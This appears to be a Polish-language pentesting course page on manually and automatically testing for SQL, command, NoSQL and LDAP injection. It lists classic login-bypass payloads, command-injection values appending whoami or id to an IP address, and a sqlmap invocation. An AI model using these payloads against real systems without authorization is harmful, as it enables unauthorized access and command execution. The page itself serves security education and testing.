---
id: "a03-injection-testowanie"
title: "🧪 3.3.2 – Metody testowania podatności"
sidebar_position: 12
---

## 🎯 Cel sekcji

Poznać skuteczne techniki wykrywania podatności typu **Injection**, w szczególności SQL Injection, Command Injection i NoSQL Injection – zarówno manualnie, jak i za pomocą narzędzi.

---

## 🧪 Test 1: SQL Injection (ręczny)

### Kroki:
1. Zidentyfikuj punkt wejścia: formularz logowania, pole wyszukiwania, parametr w URL.
2. Wstrzyknij klasyczne payloady:

```sql
' OR '1'='1
admin' --
" OR 1=1 --
```

3. Obserwuj:
- Czy logowanie się udało?
- Czy pojawił się błąd SQL?
- Czy można wyciągnąć dane?

---

## 🧪 Test 2: Command Injection

### Kroki:
1. Zidentyfikuj funkcję wykonującą polecenia systemowe (np. ping, traceroute, zip upload).
2. Wstrzyknij payload:

```bash
127.0.0.1; whoami
```

lub

```bash
127.0.0.1 && id
```

3. Sprawdź, czy wynik polecenia pojawia się w odpowiedzi.

---

## 🧪 Test 3: NoSQL Injection (np. MongoDB)

### Kroki:
1. Zlokalizuj API lub formularz korzystający z MongoDB.
2. Wstrzyknij:

```json
{ "username": { "$ne": null }, "password": { "$ne": null } }
```

lub jako URL encoded:

```
username[$ne]=1&password[$ne]=1
```

➡️ Jeśli logowanie się uda – podatność potwierdzona.

---

## 🧪 Test 4: LDAP Injection

```ldap
*)(uid=*))(|(uid=*
```

➡️ Wstaw do formularza logowania i sprawdź reakcję backendu.

---

## 🧰 Narzędzia pomocnicze

- Burp Suite (Repeater, Intruder, Logger++),
- OWASP ZAP,
- sqlmap (automatyczne wykrywanie SQLi):

```bash
sqlmap -u "http://example.com/item?id=1" --batch --banner
```

- NoSQLMap (dla MongoDB),
- Commix (Command Injection Exploiter).

---

## 🧠 Wskazówki

- Szukaj parametrów, które wpływają na logikę zapytania.
- Wstrzykuj dane krok po kroku i obserwuj reakcję aplikacji.
- Używaj proxy (Burp/ZAP), by powtarzać i modyfikować żądania.

---

W następnym kroku: **3.3.3 – Weryfikacja konfiguracji aplikacji i serwera**
